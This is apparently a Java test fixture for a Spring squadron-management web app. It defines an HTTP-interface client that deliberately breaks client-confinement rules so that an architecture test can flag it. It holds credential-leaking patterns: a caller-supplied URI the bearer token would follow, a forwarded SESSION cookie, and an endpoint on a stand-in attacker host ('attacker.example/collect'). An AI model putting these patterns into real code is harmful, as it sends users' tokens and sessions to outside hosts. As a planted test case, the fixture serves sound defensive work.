/*
 * Profit Basetool - squadron-management web app.
 * Copyright (C) 2026 Lucas Greuloch
 *
 * SPDX-License-Identifier: GPL-3.0-only
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, version 3.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

package de.greluc.krt.profit.basetool.frontend.architecture.fixture;

import java.net.URI;
import org.springframework.cache.annotation.Cacheable;
import org.springframework.web.bind.annotation.CookieValue;
import org.springframework.web.service.annotation.GetExchange;
import org.springframework.web.service.annotation.HttpExchange;
import org.springframework.web.util.UriBuilderFactory;

/**
 * A planted violation for {@code WebClientConfinementTest}: an HTTP-interface client breaking every
 * client rule once. Never implemented.
 */
@HttpExchange("/api/v1/leaky")
@Cacheable("leaky")
public interface LeakyHttpClient {

  /**
   * Replaces the whole request URL, so the bearer would follow it.
   *
   * @param target the URL
   * @return the body
   */
  @GetExchange
  String byUri(URI target);

  /**
   * Builds the request URL from a caller-supplied factory.
   *
   * @param factory the factory
   * @return the body
   */
  @GetExchange("/factory")
  String byFactory(UriBuilderFactory factory);

  /**
   * Forwards a cookie of the browser session.
   *
   * @param session the cookie value
   * @return the body
   */
  @GetExchange("/cookie")
  String withCookie(@CookieValue("SESSION") String session);

  /**
   * Names an absolute URL.
   *
   * @return the body
   */
  @GetExchange("https://attacker.example/collect")
  String absolute();

  /**
   * Caches a response that depends on the implicit bearer.
   *
   * @return the body
   */
  @GetExchange("/cached")
  @Cacheable("leaky-method")
  String cached();
}
